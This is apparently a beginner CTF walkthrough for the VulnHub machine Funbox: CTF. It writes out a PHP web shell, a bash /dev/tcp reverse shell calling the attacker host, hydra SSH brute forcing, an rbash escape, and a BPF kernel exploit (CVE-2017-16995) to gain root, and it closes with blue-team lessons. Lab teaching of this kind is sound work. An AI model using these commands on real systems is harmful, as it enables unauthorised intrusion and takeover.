# Funbox: CTF — VulnHub Walkthrough (Beginner Friendly)

> Also known as **Funbox 4**. The author (0815R2d2) subtitles it *"Groundhog
> Day: Boot2Root"* and says *"initial footstep is a bit flowed, but really not
> difficult."* The whole box is built around two hints: **`Nikto scans 'case
> sensitive'`** and **`you need a minimum of 15 mins to get user`**. Every step is
> explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: CTF |
| **Difficulty** | Easy *(some community indexes rate this one "Medium")* |
| **Author** | 0815R2d2 |
| **Released** | 5 September 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-ctf,546/ |
| **Download** | https://vulnhub.com/entry/funbox-ctf,546/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

> **Important:** the box calls itself **`funbox4`**. Add it to `/etc/hosts`
> before browsing so the site behaves the way the author intended.

---

## 0. What you will learn

- How to discover a host and scan its ports.
- Why web content discovery tools **miss uppercase files** — and how to fix that
  (`dirsearch --uppercase`, or just asking for `/ROBOTS.TXT` directly).
- How a hidden directory pointed to by `robots.txt` can hide an **upload form**.
- How an unrestricted file upload becomes **remote code execution**.
- How to build a *targeted* wordlist from a hint and brute-force SSH with
  `hydra` (the "15 minutes" in the box description is a clue about this step).
- How an **outdated Linux kernel** (CVE-2017-16995) gives local root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali running, OVA imported, both VMs on
the same host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
# List live hosts with ARP (fast, works even if the host blocks ping)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep first, then version detection on the open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,110,143 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** we have a web server (`:80`) and three mail services
> (`:110`, `:143`). The web server is the most promising. The `-A` flag on a
> full scan also reveals the machine's **hostname, `funbox4`**.

### 2.1 Fix the hostname

```bash
sudo -e /etc/hosts
```

Add this line (keep any existing lines):

```text
192.168.56.101  funbox4
```

> **Why it works:** `/etc/hosts` resolves `funbox4` to the target without DNS.
> Virtual-hosted sites often serve different content depending on the requested
> hostname, and the author built the box assuming you browse by name.

### 2.2 A boring default page (the "flowed" first step)

Browsing `http://funbox4/` shows the **Apache2 Ubuntu Default Page**. There is
nothing interesting in the HTML, so we have to *find* the hidden content.

```bash
# Common wordlists miss the title-case / uppercase files on this box
gobuster dir -u http://funbox4/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

```text
# ... nothing useful ...
```

```bash
# dirsearch can also try UPPERCASE names - the box hint says "case sensitive"
dirsearch -u http://funbox4/ -w /usr/share/wordlists/dirb/common.txt -t 40 --uppercase
```

```text
[12:00:01] 200 -   16B  - /ROBOTS.TXT
[12:00:01] 301 -  316B  - /upload/
```

> **Why it works:** Linux is case-sensitive, but most wordlists are lowercase.
> A file literally named `ROBOTS.TXT` is invisible to `gobuster` yet obvious to a
> scanner that tries case variations. This is exactly the box's first hint:
> *"Nikto scans 'case sensitive'."*

![nmap scan and robots.txt discovery](images/02-nmap.png)

### 2.3 The hidden hint

```bash
curl http://funbox4/ROBOTS.TXT
```

```text
User-agent: *
Disallow: igmseklhgmrjmtherij2145236
```

> **How to read it:** `robots.txt` tells crawlers what *not* to index. Attackers
> read it as a **list of interesting things to index**. Here it exposes a random
> directory name.

```bash
# Enumerate the "hidden" directory the robots file pointed us to
dirsearch -u http://funbox4/igmseklhgmrjmtherij2145236/ -t 40 -x php,html
```

```text
[12:10:01] 200 -  ... - /igmseklhgmrjmtherij2145236/upload.html
[12:10:01] 200 -  ... - /igmseklhgmrjmtherij2145236/upload.php
```

(Exact directory/file names vary a little between builds — follow whatever your
scanner finds.)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: an unrestricted file upload

`upload.html` is a simple **file upload form**. The handler lets us upload a
`.php` file, and Apache then *executes* it. That is **arbitrary code execution by
design**.

Create a tiny web shell:

```bash
printf '%s\n' '<?php echo "Shell"; system($_GET['"'"'cmd'"'"']); ?>' > shell.php
cat shell.php
```

```text
<?php echo "Shell"; system($_GET['cmd']); ?>
```

> **Why it works:** `system()` runs whatever command we pass in the `cmd` query
> parameter, as the user Apache runs as.

Upload `shell.php` through the form, then confirm execution:

```bash
curl "http://funbox4/igmseklhgmrjmtherij2145236/upload/shell.php?cmd=whoami"
```

```text
www-data
```

> **Why it works:** the response contains the output of `whoami`, proving our PHP
> is executing server-side as `www-data`.

### 3.2 Upgrade to a reverse shell

A web shell is fine for one-off commands; a reverse shell is easier to work in.

```bash
# On Kali: start a listener
nc -lvnp 4444
```

Ask the web shell to connect back:

```bash
curl "http://funbox4/igmseklhgmrjmtherij2145236/upload/shell.php?cmd=bash+-i+>%26+/dev/tcp/192.168.56.10/4444+0>%261"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48912
www-data@funbox4:/var/www/html/igmseklhgmrjmtherij2145236/upload$
```

We now have a shell as `www-data`. Upgrade it to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on Kali: stty raw -echo; fg
```

![unrestricted file upload to reverse shell](images/03-foothold.png)

### 3.3 The other hint — a password note

While enumerating `/home`, we find a home directory for a user named `thomas`
containing a hidden note:

```bash
ls -la /home
cat /home/thomas/.todo 2>/dev/null
```

```text
# ... something like: the user password ends with "!"
```

> **Why it works:** the author hid the *second* hint here. It tells us the shape
> of the password we need, which lets us build a **targeted** wordlist instead of
> brute-forcing blindly.

There is no readable user flag in the web root — the "user" step on this box is
**logging in as `thomas`**, which we do in the next section.

---

## 4. Privilege escalation — becoming root

### 4.1 Step 1 — get a real user account (SSH brute force)

The description promises *"a minimum of 15 mins to get user"*. The hint file says
the password ends with `!`, so we append `!` to every line of `rockyou.txt`:

```bash
# Build the targeted wordlist (this is the part that "joyfully" takes time)
sed 's/$/!/' /usr/share/wordlists/rockyou.txt > /tmp/rockyou-bang.txt

hydra -l thomas -P /tmp/rockyou-bang.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: thomas   password: thebest!
```

> **Why it works:** the hint narrows a ~14-million-word list down to a far more
> likely candidate set. `thomas`'s password is a dictionary word with `!`
> appended. *(The exact password varies by build — use whatever `hydra` finds.)*

```bash
ssh thomas@192.168.56.101
# password: thebest!   (rbash: a restricted shell)
```

The shell is **restricted (`rbash`)** — `cd`, `/`, and many commands are blocked.
Escape it by launching an unrestricted shell:

```bash
ssh thomas@192.168.56.101 -t "bash --noprofile"
```

> **Why it works:** `-t` forces a TTY and `bash --noprofile` starts a normal
> shell, bypassing the restricted one set in `thomas`'s account.

### 4.2 Step 2 — kernel exploit to root

```bash
uname -a
cat /etc/os-release
```

```text
Linux funbox4 4.4.0-21-generic #37-Ubuntu SMP ... x86_64 GNU/Linux
```

> **How to read it:** kernel **4.4.0-21** is vulnerable to
> **CVE-2017-16995** — a flaw in the BPF verifier that allows local users to
> escalate to root. It is public as **Exploit-DB 45010**.

```bash
searchsploit "Linux Kernel 4.4" | grep 45010
```

```text
Linux Kernel 4.4.0 (Ubuntu 16.04 / 16.10) - 'BPF' Local Privilege Escalation | linux/local/45010.c
```

Copy `45010.c` to the target and compile it there:

```bash
# On Kali
python3 -m http.server 8000            # serve the exploit
# On the target (thomas)
wget http://192.168.56.10:8000/45010.c
gcc 45010.c -o exploit                 # the file header shows the build command
./exploit
```

```text
[+] Success
root@funbox4:/home/thomas#
```

> **Why it works:** the exploit abuses the vulnerable BPF JIT/verifier to run a
> payload with `root` privileges.

### The root flag

```bash
id
cat /root/flag.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
# ... the root flag; name/path varies by build
```

![kernel exploit to root](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden content in `robots.txt` | HTTP `/ROBOTS.TXT` | Directory discovery |
| 2 | Unrestricted file upload (`.php`) | `upload.php` | Remote Code Execution as `www-data` |
| 3 | Weak/guessable SSH password + hint leak | `/home/thomas/.todo` | SSH access as `thomas` |
| 4 | Outdated kernel (CVE-2017-16995) | Linux 4.4.0-21 | Local Privilege Escalation to `root` |
| 5 | Restricted shell treated as security | `rbash` | Trivial bypass with `bash --noprofile` |

## 6. Defensive lessons (blue team)

- **Never upload to a web-executable directory.** Store uploads outside the web
  root, rename them, and validate type/size. Even better: don't allow uploads at
  all unless required.
- **Don't leak secrets in `robots.txt`.** It is *published*, not hidden. Use it
  only to disallow crawling, never to reference "hidden" directories.
- **Enforce strong password policy.** Dictionary words with a trailing `!` are
  trivially generated. Enforce length and add MFA or key-based SSH.
- **Patch the kernel.** Track your distribution's security advisories; 4.4.x is
  long end-of-life.
- **`rbash` is not a security boundary.** Do not rely on it to contain a user;
  use real sandboxing/permissions.
- **Detection:** alert on successful file uploads that are then requested and
  executed, and on `hydra`-style SSH auth failures from a single source.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-ctf,546/
- Exploit-DB 45010 — Linux Kernel 4.4.0 'BPF' Local Privilege Escalation:
  https://www.exploit-db.com/exploits/45010
- CVE-2017-16995 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2017-16995
- GTFOBins: https://gtfobins.github.io/
- Community writeups consulted:
  - [Funbox: CTF 靶机测试 (hirak0)](https://www.cnblogs.com/hirak0/articles/16086261.html)
  - [Infosec Institute — FUNBOX: VulnHub CTF walkthrough](https://www.infosecinstitute.com/resources/capture-the-flag/funbox-vulnhub-ctf-walkthrough)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — nmap results + `/ROBOTS.TXT` discovery
- [ ] `images/03-foothold.png` — the upload form and web shell RCE
- [ ] `images/04-root-flag.png` — kernel exploit and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
